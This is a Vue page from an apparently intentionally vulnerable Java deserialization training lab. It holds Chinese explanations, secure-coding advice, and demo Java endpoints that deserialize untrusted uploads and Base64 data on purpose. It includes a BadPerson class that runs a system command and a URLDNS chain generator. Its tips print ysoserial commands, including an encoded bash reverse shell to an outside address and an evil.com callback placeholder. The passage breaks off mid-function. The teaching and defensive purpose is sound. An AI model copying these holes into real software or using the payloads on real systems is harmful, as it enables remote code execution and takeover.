<template>
  <div class="root-div">
    <div class="vuln-info">
      <div class="header-div">反序列化漏洞（Java Deserialization Vulnerability）</div>
      <div class="body-div">
        <el-tabs v-model="activeName" @tab-click="handleClick">
          <el-tab-pane label="漏洞描述" name="first">
            <div class="vuln-detail">
              Java反序列化漏洞是指当应用程序反序列化不受信任的数据时，攻击者可以通过构造恶意的序列化数据来执行任意代码或进行其他恶意操作。这种漏洞通常发生在使用ObjectInputStream进行反序列化操作时。<br/>
              <br/>
              常见原因：<br/>
              1. 直接反序列化用户输入的数据而不进行验证<br/>
              2. 使用ObjectInputStream反序列化不受信任的数据<br/>
              3. 没有实施类白名单验证机制<br/>
              4. 使用已知存在漏洞的序列化库<br/>
              5. 反序列化包含恶意readObject方法的对象<br/>
            </div>
          </el-tab-pane>
          <el-tab-pane label="漏洞危害" name="second">
            <div class="vuln-detail">
              1. 远程代码执行（RCE）- 攻击者可以执行任意系统命令<br/>
              2. 服务器端请求伪造（SSRF）- 触发DNS查询或网络请求<br/>
              3. 拒绝服务攻击（DoS）- 通过恶意对象消耗系统资源<br/>
              4. 信息泄露 - 获取系统敏感信息<br/>
              5. 权限提升 - 绕过安全控制机制<br/>
              6. 数据篡改 - 修改应用程序数据<br/>
              <br/>
              <strong>利用工具危害：</strong><br/>
              • ysoserial工具可以生成各种危险的反序列化Payload<br/>
              • CommonsCollections链可以执行任意命令<br/>
              • URLDNS链可以触发DNS查询，用于漏洞检测<br/>
              • JRMPClient链可以建立远程连接<br/>
              • 攻击者只需一个Base64编码的序列化数据即可完成攻击<br/>
            </div>
          </el-tab-pane>
          <el-tab-pane label="安全编码" name="third">
            <div class="vuln-detail">
              【必须】实施类白名单验证
              使用自定义的ObjectInputStream，只允许反序列化安全的类，明确禁止反序列化危险类（如Runtime、ProcessBuilder等）。
              <br />
              <br />
              【必须】避免直接反序列化用户输入
              不要直接使用ObjectInputStream反序列化用户提供的数据，应该使用安全的序列化库（如Jackson、Gson）。
              <br />
              <br />
              【必须】实施输入验证
              对序列化数据进行格式验证，确保数据来源可信，避免反序列化恶意构造的数据。
              <br />
              <br />
              【必须】禁止反序列化危险类
              明确禁止反序列化Commons Collections、Spring Framework等存在漏洞的第三方库类。
              <br />
              <br />
              【建议】使用安全的序列化库
              使用Jackson、Gson等安全的JSON序列化库替代Java原生序列化，避免readObject方法的执行。
              <br />
              <br />
              【建议】监控反序列化操作
              记录和监控反序列化操作，及时发现异常行为。
              <br />
              <br />
              【建议】定期安全扫描
              使用ysoserial等工具定期测试反序列化防护措施的有效性。
            </div>
          </el-tab-pane>
          <el-tab-pane label="参考文章" name="fourth">
            <div class="vuln-detail">
              <b>相关技术文档和参考资源：</b>
              <br/><br/>
              <b>官方文档：</b>
              <ul>
                <li><a href="https://docs.oracle.com/javase/8/docs/api/java/io/ObjectInputStream.html" target="_blank" style="text-decoration: underline;">Java ObjectInputStream官方文档</a></li>
                <li><a href="https://docs.oracle.com/javase/8/docs/api/java/io/Serializable.html" target="_blank" style="text-decoration: underline;">Java Serializable接口文档</a></li>
              </ul>
              <br/>
              <b>安全最佳实践：</b>
              <ul>
                <li><a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" target="_blank" style="text-decoration: underline;">OWASP A08:2021 - 软件和数据完整性故障</a></li>
                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" target="_blank" style="text-decoration: underline;">OWASP反序列化安全检查清单</a></li>
              </ul>
              <br/>
              <b>漏洞分析文章：</b>
              <ul>
                <li><a href="https://www.owasp.org/index.php/Deserialization_of_untrusted_data" target="_blank" style="text-decoration: underline;">OWASP反序列化漏洞分析</a></li>
                <li><a href="https://www.baeldung.com/jackson-deserialization" target="_blank" style="text-decoration: underline;">Jackson安全反序列化教程</a></li>
                <li><a href="https://mp.weixin.qq.com/s?__biz=MzU1MTA4ODM4MQ==&mid=2247484913&idx=1&sn=5295919ee9faa7bfbe89b9599d400967&chksm=fb97fc63cce07575bcad2c13ad69fddd8bf3e625f648dabbca3bd0255556fcbb2e984d8e9ca6&scene=178&cur_album_id=3037189018041483264&search_click_id=#rd" target="_blank" style="text-decoration: underline;">java序列化和反序列化</a></li>
              </ul>
              <br/>
              <b>攻击工具和利用：</b>
              <ul>
                <li><a href="https://github.com/frohoff/ysoserial" target="_blank" style="text-decoration: underline;">ysoserial - 反序列化漏洞利用工具</a></li>
                <li><strong>常用Payload：</strong>CommonsCollections1、CommonsCollections2、URLDNS、JRMPClient、Jdk7u21等</li>
                <li><strong>生成命令示例：</strong><code>java -jar ysoserial.jar CommonsCollections1 "whoami" | base64</code></li>
                <li><strong>DNS检测：</strong><code>java -jar ysoserial.jar URLDNS "http://test.dnslog.cn" | base64</code></li>
              </ul>
              <br/>
              <b>工具和检测：</b>
              <ul>
                <li><a href="https://github.com/OWASP/CheatSheetSeries" target="_blank" style="text-decoration: underline;">OWASP安全配置检查清单</a></li>
                <li><a href="https://github.com/whitel1st/docem" target="_blank" style="text-decoration: underline;">docem - 反序列化漏洞检测工具</a></li>
              </ul>
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </div>
    <div class="code-demo">
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              Java原生序列化和反序列化介绍
              <el-button type="success" round size="mini" @click="showBasicDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">// 基础序列化演示 - 将Person对象序列化为文件
@PostMapping("/serializePerson")
public ResponseEntity&lt;byte[]&gt; serializePerson(@RequestBody Person person) {
    // 1. 生成唯一文件名
    String fileName = "person_" + System.currentTimeMillis() + ".ser";
    String filePath = imagesDir + "/" + fileName;

    // 2. 序列化对象到文件
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath));
    oos.writeObject(person);
    oos.close();

    // 3. 读取文件内容
    byte[] fileBytes = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(filePath));

    // 4. 设置响应头，让浏览器下载文件
    HttpHeaders headers = new HttpHeaders();
    headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);
    headers.add(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + fileName + "\"");
    headers.add("Access-Control-Expose-Headers", "Content-Disposition");

    return new ResponseEntity&lt;&gt;(fileBytes, headers, HttpStatus.OK);
}

// 基础反序列化演示 - 从上传的文件反序列化Person对象
@PostMapping("/deserializePerson")
public Result deserializePerson(@RequestParam("file") MultipartFile file) {
    // 验证文件
    if (file.isEmpty()) {
        return Result.error("上传的文件为空");
    }
    
    // 从上传的文件读取序列化数据
    byte[] serializedData = file.getBytes();
    
    // 验证序列化文件头
    if (serializedData.length &lt; 2 || serializedData[0] != (byte)0xAC || serializedData[1] != (byte)0xED) {
        return Result.error("无效的序列化文件格式，缺少正确的文件头");
    }
    
    // 反序列化对象
    ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
    ObjectInputStream ois = new ObjectInputStream(bais);
    Object deserializedObject = ois.readObject();
    ois.close();
    
    // 验证反序列化的对象类型
    if (!(deserializedObject instanceof Person)) {
        return Result.error("反序列化的对象不是Person类型");
    }
    
    Person deserializedPerson = (Person) deserializedObject;
    return Result.success("反序列化成功: " + deserializedPerson.toString());
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              反序列化恶意对象-执行危险命令
              <el-button type="danger" round size="mini" @click="showMaliciousDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">// 恶意对象类 - BadPerson
public class BadPerson implements Serializable {
    private String name;
    private Integer age;
    
    // 反序列化时会自动调用的私有方法
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject();
        // 恶意代码：执行系统命令
        Process process = Runtime.getRuntime().exec("id");
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream())
        );
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        System.out.println("BadPerson反序列化时执行命令结果: " + output.toString());
    }
}

// 危险的反序列化操作
@PostMapping("/badPersonDeserialize")
public Result badPersonDeserialize(@RequestParam("file") MultipartFile file) {
    // 从上传的文件读取序列化数据
    byte[] serializedData = file.getBytes();
    
    // 验证序列化文件头
    if (serializedData.length &lt; 2 || serializedData[0] != (byte)0xAC || serializedData[1] != (byte)0xED) {
        return Result.error("无效的序列化文件格式");
    }
    
    // 重定向System.out来捕获命令执行结果
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    PrintStream originalOut = System.out;
    System.setOut(new PrintStream(baos));
    
    try {
        // 反序列化恶意对象 - 这里会触发恶意代码执行
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
        ObjectInputStream ois = new ObjectInputStream(bais);
        BadPerson deserializedObject = (BadPerson) ois.readObject();
        ois.close();
        
        // 获取捕获的输出
        String capturedOutput = baos.toString();
        String resultMessage = "反序列化成功: " + deserializedObject.toString();
        if (capturedOutput.contains("BadPerson反序列化时执行命令结果:")) {
            resultMessage += "\n命令执行结果: " + capturedOutput.split("BadPerson反序列化时执行命令结果:")[1].trim();
        }
            
        return Result.success(resultMessage);
    } finally {
        // 恢复原始的System.out
        System.setOut(originalOut);
    }
}</code></pre>
          </div>
        </el-col>
      </el-row>
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              URLDNS链实现 - 使用HashMap + URL触发DNS查询
              <el-button type="warning" round size="mini" @click="showUrlDnsDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">// URLDNS链实现 - 通过使用HashMap两次反射触发URLDNS查询
@PostMapping("/serializeURLDNS")
public ResponseEntity&lt;byte[]&gt; serializeURLDNS(@RequestBody Map&lt;String, String&gt; request) {
    try {
        String dnsUrl = request.get("dnsUrl");
        
        // 生成URLDNS链序列化数据
        byte[] serializedData = generateURLDNSChain(dnsUrl);
        
        // 设置响应头，让浏览器下载文件
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);
        headers.add(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"urldns.ser\"");
        
        return new ResponseEntity&lt;&gt;(serializedData, headers, HttpStatus.OK);
    } catch (Exception e) {
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).build();
    }
}

/**
 * 生成URLDNS链的序列化数据
 * 使用HashMap + URL的方式实现DNSLOG攻击
 */
private byte[] generateURLDNSChain(String dnsUrl) throws Exception {
    // 1. 定义一个URL实例
    URL url = new URL(dnsUrl);
    
    // 2. 定义一个HashMap实例
    Map&lt;URL, String&gt; hashmap = new HashMap&lt;&gt;();
    
    // 3. 反射将url对象的hashCode属性值为非-1，为了不让序列化时发起dns请求
    Class&lt;? extends URL&gt; urlClass = url.getClass();
    Field hashCodeField = urlClass.getDeclaredField("hashCode");
    hashCodeField.setAccessible(true);
    hashCodeField.set(url, 1234);
    
    // 4. 将url实例存入hashmap中
    hashmap.put(url, "SecNotes");
    
    // 5. 反射将url对象的hashCode属性改为-1，这样反序列化的时候才可以执行hashCode方法
    hashCodeField.set(url, -1);
    
    // 6. 序列化HashMap
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);
    oos.writeObject(hashmap);
    oos.close();
    
    return baos.toByteArray();
}

// URLDNS链反序列化 - 触发DNS查询
@PostMapping("/urldnsDeserialize")
public Result urldnsDeserialize(@RequestParam("file") MultipartFile file) {
    try {
        // 验证文件
        if (file.isEmpty()) {
            return Result.error("上传的文件为空");
        }
        
        // 从上传的文件读取序列化数据
        byte[] serializedData = file.getBytes();
        
        // 反序列化URLDNS链 - 这里会触发DNS查询
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object deserializedObject = ois.readObject();
        ois.close();
        
        return Result.success("URLDNS链反序列化成功，对象类型: " + deserializedObject.getClass().getName());
    } catch (Exception e) {
        return Result.error("URLDNS链反序列化失败: " + e.getMessage());
    }
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              反序列化恶意对象-Base64数据
              <el-button type="danger" round size="mini" @click="showBase64Dialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">// 最危险的反序列化操作 - 接受Base64编码的序列化数据
@PostMapping(value = "/base64Deserialize", consumes = "text/plain")
public Result base64Deserialize(@RequestBody String base64Data) {
    try {
        // 清理Base64数据，移除可能的空白字符和换行符
        String cleanedBase64Data = base64Data.trim().replaceAll("\\s+", "");
        
        // 解码Base64数据
        byte[] serializedData = Base64.getDecoder().decode(cleanedBase64Data);
        
        // 直接反序列化 - 这是最危险的操作
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object deserializedObject = ois.readObject();
        ois.close();
        
        return Result.success("Base64反序列化成功: " + deserializedObject.toString());
    } catch (Exception e) {
        return Result.error("Base64反序列化失败: " + e.getMessage());
    }
}

// 安全版本 - 使用白名单验证
@PostMapping(value = "/secureDeserialize", consumes = "text/plain")
public Result secureDeserialize(@RequestBody String base64Data) {
    try {
        // 清理Base64数据，移除可能的空白字符和换行符
        String cleanedBase64Data = base64Data.trim().replaceAll("\\s+", "");
        
        // 解码Base64数据
        byte[] serializedData = Base64.getDecoder().decode(cleanedBase64Data);
        
        // 使用自定义的ObjectInputStream进行安全检查
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
        SecureObjectInputStream ois = new SecureObjectInputStream(bais);
        Object deserializedObject = ois.readObject();
        ois.close();
        
        return Result.success("安全反序列化成功: " + deserializedObject.toString());
    } catch (Exception e) {
        return Result.error("安全反序列化失败: " + e.getMessage());
    }
}</code></pre>
          </div>
        </el-col>
      </el-row>
    </div>

    <!-- 基础序列化/反序列化测试对话框 -->
    <el-dialog title="基础序列化/反序列化演示" :visible.sync="basicDialogVisible" class="center-dialog" width="50%">
      <div style="text-align: center; color: red; font-style: italic; margin-bottom: 20px;">
        展示序列化和反序列化的完整流程：先序列化Person对象为文件，再反序列化文件恢复对象
      </div>
      <div style="margin-bottom: 20px;">
        <el-tabs v-model="basicTab" type="card">
          <el-tab-pane label="序列化操作" name="serialize">
            <el-form :model="basicForm" :inline="true" class="demo-form-inline">
              <el-form-item label="姓名" label-width="80px">
                <el-input v-model="basicForm.name" placeholder="请输入姓名" style="width: 200px;"></el-input>
              </el-form-item>
              <br />
              <el-form-item label="年龄" label-width="80px">
                <el-input-number v-model="basicForm.age" :min="1" :max="150" style="width: 200px;"></el-input-number>
              </el-form-item>
              <br />
              <el-form-item>
                <el-button type="primary" @click="serializePerson">序列化并下载文件</el-button>
              </el-form-item>
            </el-form>
            <div v-if="serializeResult" style="margin-top: 15px;">
              <p style="color: #409EFF; margin: 0; font-size: 14px; white-space: pre-wrap;">{{ serializeResult }}</p>
            </div>
          </el-tab-pane>
          <el-tab-pane label="反序列化操作" name="deserialize">
            <div style="text-align: center;">
              <input type="file" id="basicFileInput" @change="handleFileChange" accept=".ser" style="margin-right: 10px;" />
              <button @click="deserializePerson" :disabled="!selectedFile" style="background-color: #67c23a; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer;">反序列化文件</button>
            </div>
            <div v-if="deserializeResult" style="margin-top: 15px;">
              <p style="color: #409EFF; margin: 0; font-size: 14px; white-space: pre-wrap;">{{ deserializeResult }}</p>
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </el-dialog>

    <!-- 恶意对象反序列化测试对话框 -->
    <el-dialog title="恶意对象反序列化测试" :visible.sync="maliciousDialogVisible" class="center-dialog" width="50%">
      <div style="text-align: center; color: red; font-style: italic; margin-bottom: 20px;">
        危险：反序列化BadPerson对象会执行系统命令，请谨慎测试：
      </div>
      <div style="margin-bottom: 20px;">
        <el-tabs v-model="maliciousTab" type="card">
          <el-tab-pane label="序列化操作" name="serialize">
            <el-form :model="maliciousForm" :inline="true" class="demo-form-inline">
              <el-form-item label="姓名" label-width="80px">
                <el-input v-model="maliciousForm.name" placeholder="请输入姓名" style="width: 200px;"></el-input>
              </el-form-item>
              <br />
              <el-form-item label="年龄" label-width="80px">
                <el-input-number v-model="maliciousForm.age" :min="1" :max="150" style="width: 200px;"></el-input-number>
              </el-form-item>
              <br />
              <el-form-item>
                <el-button type="danger" @click="serializeBadPerson">序列化BadPerson并下载文件</el-button>
              </el-form-item>
            </el-form>
            <div v-if="maliciousSerializeResult" style="margin-top: 15px;">
              <p style="color: #409EFF; margin: 0; font-size: 14px; white-space: pre-wrap;">{{ maliciousSerializeResult }}</p>
            </div>
          </el-tab-pane>
          <el-tab-pane label="反序列化操作" name="deserialize">
            <div style="text-align: center;">
              <input type="file" id="maliciousFileInput" @change="handleBadPersonFileChange" accept=".ser" style="margin-right: 10px;" />
              <button @click="testBadPersonDeserialize" :disabled="!selectedBadPersonFile" style="background-color: #f56c6c; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer;">反序列化BadPerson文件</button>
            </div>
            <div v-if="maliciousResult" style="margin-top: 15px; padding: 10px; background-color: #fef0f0; border: 1px solid #f56c6c; border-radius: 4px;">
              <h4 style="margin: 0 0 10px 0; color: #f56c6c;">测试结果：</h4>
              <pre style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 12px;">{{ maliciousResult }}</pre>
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </el-dialog>

    <!-- URLDNS链反序列化测试对话框 -->
    <el-dialog title="URLDNS链反序列化测试" :visible.sync="urldnsDialogVisible" class="center-dialog" width="50%">
      <div style="text-align: center; color: #E6A23C; font-style: italic; margin-bottom: 20px;">
        通过URLDNS链触发DNS查询，观察网络请求：
      </div>
      <div style="margin-bottom: 20px; padding: 10px; background-color: #fdf6ec; border: 1px solid #e6a23c; border-radius: 4px;">
        <ul style="margin: 0; padding-left: 20px; text-align: left;">
          <li><strong>序列化操作：</strong>生成包含恶意URL的序列化数据，<span style="color: #67c23a;">不会触发DNS解析</span></li><br />
          <li><strong>反序列化操作：</strong>读取序列化数据时，<span style="color: #f56c6c;">会触发DNS解析</span>，可以在DNSLOG平台观察到请求</li>
        </ul>
      </div>
      <div style="margin-bottom: 20px;">
        <el-tabs v-model="urldnsTab" type="card">
          <el-tab-pane label="序列化操作" name="serialize">
            <el-form :model="urldnsForm" :inline="true" class="demo-form-inline">
              <el-form-item label="DNS URL" label-width="80px">
                <el-input v-model="urldnsForm.dnsUrl" placeholder="例如：http://test.dnslog.cn 或 http://evil.com" style="width: 300px;"></el-input>
              </el-form-item>
              <br />
              <el-form-item label="消息" label-width="80px">
                <el-input v-model="urldnsForm.message" placeholder="对象消息" style="width: 200px;"></el-input>
              </el-form-item>
              <br />
              <el-form-item>
                <el-button type="warning" @click="serializeURLDNS">序列化URLDNS链并下载文件</el-button>
              </el-form-item>
            </el-form>
            <div v-if="urldnsSerializeResult" style="margin-top: 15px;">
              <p style="color: #409EFF; margin: 0; font-size: 14px; white-space: pre-wrap;">{{ urldnsSerializeResult }}</p>
            </div>
          </el-tab-pane>
          <el-tab-pane label="反序列化操作" name="deserialize">
            <div style="text-align: center;">
              <input type="file" id="urldnsFileInput" @change="handleUrlDnsFileChange" accept=".ser" style="margin-right: 10px;" />
              <button @click="testUrlDnsDeserialize" :disabled="!selectedUrlDnsFile" style="background-color: #e6a23c; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer;">反序列化URLDNS链文件</button>
            </div>
            <div v-if="urldnsResult" style="margin-top: 15px; padding: 10px; background-color: #fdf6ec; border: 1px solid #e6a23c; border-radius: 4px;">
              <h4 style="margin: 0 0 10px 0; color: #e6a23c;">测试结果：</h4>
              <pre style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 12px;">{{ urldnsResult }}</pre>
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </el-dialog>

    <!-- Base64反序列化测试对话框 -->
    <el-dialog title="反序列化恶意对象-Base64数据测试" :visible.sync="base64DialogVisible" class="center-dialog" width="60%">
      <div style="text-align: center; color: red; font-style: italic; margin-bottom: 20px;">
        最危险：接受Base64编码的序列化数据进行反序列化，这是最危险的场景！
      </div>
      <div style="margin-bottom: 20px; padding: 10px; background-color: #fef0f0; border: 1px solid #f56c6c; border-radius: 4px;">
        <h4 style="margin: 0 0 10px 0; color: #f56c6c;">攻击工具提示：</h4>
        <ul style="margin: 0; padding-left: 20px; text-align: left;">
          <li><strong>ysoserial工具：</strong>可以使用ysoserial工具生成各种危险的序列化数据进行反序列化攻击</li>
          <li><strong>常用Payload：</strong>CommonsCollections1、CommonsCollections2、URLDNS、JRMPClient等</li>
          <li><strong>生成命令：</strong><code>java -jar ysoserial.jar CommonsCollections1 "whoami" | base64</code></li>
          <li><strong>反弹shell：</strong><code>java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjguOC44LzEyMzQgMD4mMQo=}|{base64,-d}|{bash,-i}" | base64</code></li>
          <li><strong>安全建议：</strong>在生产环境中应该使用白名单验证，禁止反序列化危险类</li>
        </ul>
      </div>
      <div style="margin-bottom: 20px;">
        <el-form :model="base64Form" class="demo-form-inline">
          <el-form-item>
            <el-input 
              type="textarea" 
              v-model="base64Form.data" 
              :rows="4"
              placeholder="请输入Base64编码的序列化数据"
              style="width: 400px;"></el-input>
          </el-form-item>
          <el-form-item>
            <el-button type="danger" @click="testBase64Deserialize">测试Base64反序列化</el-button>
            <el-button type="success" @click="testSecureDeserialize">测试安全反序列化</el-button>
          </el-form-item>
        </el-form>
      </div>
      <div v-if="base64Result" style="margin-top: 15px; padding: 10px; background-color: #fef0f0; border: 1px solid #f56c6c; border-radius: 4px;">
        <h4 style="margin: 0 0 10px 0; color: #f56c6c;">测试结果：</h4>
        <pre style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 12px;">{{ base64Result }}</pre>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import { 
  serializePerson, 
  deserializePerson,
  serializeBadPerson,
  deserializeBadPerson,
  serializeURLDNS,
  deserializeURLDNS,
  base64Deserialize, 
  secureDeserialize
} from '@/api/deserialize'

export default {
  name: 'DeserializeVuln',
  data() {
    return {
      activeName: 'first',
      basicDialogVisible: false,
      maliciousDialogVisible: false,
      urldnsDialogVisible: false, // 新增URLDNS对话框的visible状态
      base64DialogVisible: false,
      
      // 基础序列化/反序列化相关
      basicTab: 'serialize',
      basicForm: {
        name: '张三',
        age: 25
      },
      serializeResult: '',
      deserializeResult: '',
      selectedFile: null,

      // 恶意对象反序列化测试对话框相关
      maliciousTab: 'serialize',
      maliciousForm: {
        name: '李四',
        age: 30
      },
      maliciousSerializeResult: '',
      maliciousResult: '',
      selectedBadPersonFile: null,

      // URLDNS链反序列化测试对话框相关
      urldnsTab: 'serialize',
      urldnsForm: {
        dnsUrl: 'http://test.dnslog.cn',
        message: '这是一个URLDNS对象'
      },
      urldnsSerializeResult: '',
      urldnsResult: '',
      selectedUrlDnsFile: null,

      // Base64反序列化表单
      base64Form: {
        data: ''
      },
      base64Result: '',


    }
  },
  methods: {
    handleClick(tab, event) {},
    
    showBasicDialog() {
      this.basicDialogVisible = true;
      this.serializeResult = '';
      this.deserializeResult = '';
      this.selectedFile = null;
      // 清空文件选择器的历史记录
      const fileInput = document.getElementById('basicFileInput');
      if (fileInput) {
        fileInput.value = '';
      }
    },
    
    showMaliciousDialog() {
      this.maliciousDialogVisible = true;
      this.maliciousResult = '';
      this.maliciousSerializeResult = '';
      this.selectedBadPersonFile = null; // 重置文件选择器
      // 清空文件选择器的历史记录
      const fileInput = document.getElementById('maliciousFileInput');
      if (fileInput) {
        fileInput.value = '';
      }
    },

    // 序列化BadPerson对象
    async serializeBadPerson() {
      try {
        const response = await serializeBadPerson(this.maliciousForm)
        let fileName = 'badPerson.ser'
        
        // 获取Content-Disposition响应头
        let disposition = response.headers && response.headers['content-disposition']
        if (disposition) {
          const match = disposition.match(/filename="?([^";]+)"?/)
          if (match && match[1]) {
            fileName = decodeURIComponent(match[1])
          }
        }
        
        // 处理Blob数据
        let blob = response.data
        if (!(blob instanceof Blob)) {
          console.warn('response.data不是Blob类型，尝试转换:', typeof response.data)
          blob = new Blob([response.data], { type: 'application/octet-stream' })
        }
        
        // 创建下载链接
        const url = window.URL.createObjectURL(blob)
        const link = document.createElement('a')
        link.href = url
        link.download = fileName
        document.body.appendChild(link)
        link.click()
        document.body.removeChild(link)
        window.URL.revokeObjectURL(url)
        
        this.maliciousSerializeResult = `BadPerson序列化成功！文件已下载到本地，文件名：${fileName}\n序列化对象：${JSON.stringify(this.maliciousForm)}`
        this.$message.success('BadPerson序列化成功，文件已下载')
      } catch (error) {
        console.error('BadPerson序列化错误:', error)
        this.maliciousSerializeResult = '错误: ' + error.message
        this.$message.error('BadPerson序列化失败')
      }
    },

    // 序列化URLDNS链对象
    async serializeURLDNS() {
      try {
        const response = await serializeURLDNS(this.urldnsForm)
        let fileName = 'urldns.ser'
        
        // 获取Content-Disposition响应头
        let disposition = response.headers && response.headers['content-disposition']
        if (disposition) {
          const match = disposition.match(/filename="?([^";]+)"?/)
          if (match && match[1]) {
            fileName = decodeURIComponent(match[1])
          }
        }
        
        // 处理Blob数据
        let blob = response.data
        if (!(blob instanceof Blob)) {
          console.warn('response.data不是Blob类型，尝试转换:', typeof response.data)
          blob = new Blob([response.data], { type: 'application/octet-stream' })
        }
        
        // 创建下载链接
        const url = window.URL.createObjectURL(blob)
        const link = document.createElement('a')
        link.href = url
        link.download = fileName
        document.body.appendChild(link)
        link.click()
        document.body.removeChild(link)
        window.URL.revokeObjectURL(url)
        
        this.urldnsSerializeResult = `URLDNS链序列化成功！文件已下载到本地，文件名：${fileName}\n序列化对象：${JSON.stringify(this.urldnsForm)}`
        this.$message.success('URLDNS链序列化成功，文件已下载')
      } catch (error) {
        console.error('URLDNS链序列化错误:', error)
        this.urldnsSerializeResult = '错误: ' + error.message
        this.$message.error('URLDNS链序列化失败')
      }
    },
    
    showUrlDnsDialog() {
      this.urldnsDialogVisible = true;
      this.urldnsResult = '';
      this.urldnsSerializeResult = '';
      this.selectedUrlDnsFile = null; // 重置文件选择器
      // 清空文件选择器的历史记录
      const fileInput = document.getElementById('urldnsFileInput');
      if (fileInput) {
        fileInput.value = '';
      }
    },
    
    showBase64Dialog() {
      this.base64DialogVisible = true;
      this.base64Result = '';
    },

    // 序列化Person对象
    async serializePerson() {
      try {
        const response = await serializePerson(this.basicForm)
        let fileName = 'person.ser'
        
        // 获取Content-Disposition响应头（只兼容axios 0.x）
        let disposition = response.headers && response.headers['content-disposition']
        if (disposition) {
          const match = disposition.match(/filename="?([^";]+)"?/)
          if (match && match[1]) {
            fileName = decodeURIComponent(match[1])
          }
        }
        
        // 处理Blob数据
        let blob = response.data
        if (!(blob instanceof Blob)) {
          console.warn('response.data不是Blob类型，尝试转换:', typeof response.data)
          blob = new Blob([response.data], { type: 'application/octet-stream' })
        }
        
        // 创建下载链接
        const url = window.URL.createObjectURL(blob)
        const link = document.createElement('a')
        link.href = url
        link.download = fileName
        document.body.appendChild(link)
        link.click()
        document.body.removeChild(link)
        window.URL.revokeObjectURL(url)
        
        this.serializeResult = `序列化成功！文件已下载到本地，文件名：${fileName}\n序列化对象：${JSON.stringify(this.basicForm)}`
        this.$message.success('序列化成功，文件已下载')
      } catch (error) {
        console.error('序列化错误:', error)
        this.serializeResult = '错误: ' + error.message
        this.$message.error('序列化失败')
      }
    },

    // 处理文件选择
    handleFileChange(event) {
      const file = event.target.files[0]
      console.log('选择的文件:', file)
      console.log('文件大小:', file.size)
      console.log('文件类型:', file.type)
      console.log('文件名:', file.name)
      
      // 验证文件类型
      if (!file.name.endsWith('.ser')) {
        this.$message.error('请选择.ser格式的序列化文件')
        return
      }
      
      // 验证文件大小
      if (file.size < 10) {
        this.$message.error('文件太小，可能不是有效的序列化文件')
        return
      }
      
      this.selectedFile = file
    },

    // 处理恶意对象反序列化文件选择
    handleBadPersonFileChange(event) {
      const file = event.target.files[0]
      console.log('选择的恶意对象序列化文件:', file)
      console.log('文件大小:', file.size)
      console.log('文件类型:', file.type)
      console.log('文件名:', file.name)

      // 验证文件类型
      if (!file.name.endsWith('.ser')) {
        this.$message.error('请选择.ser格式的恶意对象序列化文件')
        return
      }

      // 验证文件大小
      if (file.size < 10) {
        this.$message.error('文件太小，可能不是有效的恶意对象序列化文件')
        return
      }

      this.selectedBadPersonFile = file
    },

    // 处理URLDNS链反序列化文件选择
    handleUrlDnsFileChange(event) {
      const file = event.target.files[0]
      console.log('选择的URLDNS链序列化文件:', file)
      console.log('文件大小:', file.size)
      console.log('文件类型:', file.type)
      console.log('文件名:', file.name)

      // 验证文件类型
      if (!file.name.endsWith('.ser')) {
        this.$message.error('请选择.ser格式的URLDNS链序列化文件')
        return
      }

      // 验证文件大小
      if (file.size < 10) {
        this.$message.error('文件太小，可能不是有效的URLDNS链序列化文件')
        return
      }

      this.selectedUrlDnsFile = file
    },

    // 反序列化Person对象
    async deserializePerson() {
      if (!this.selectedFile) {
        this.$message.warning('请先选择序列化文件')
        return
      }
      
      try {
        console.log('开始反序列化，文件大小:', this.selectedFile.size)
        
        const formData = new FormData()
        formData.append('file', this.selectedFile, 'person.ser')
        
        const response = await deserializePerson(formData)
        this.deserializeResult = response.data
        this.$message.success('反序列化成功')
      } catch (error) {
        console.error('反序列化错误:', error)
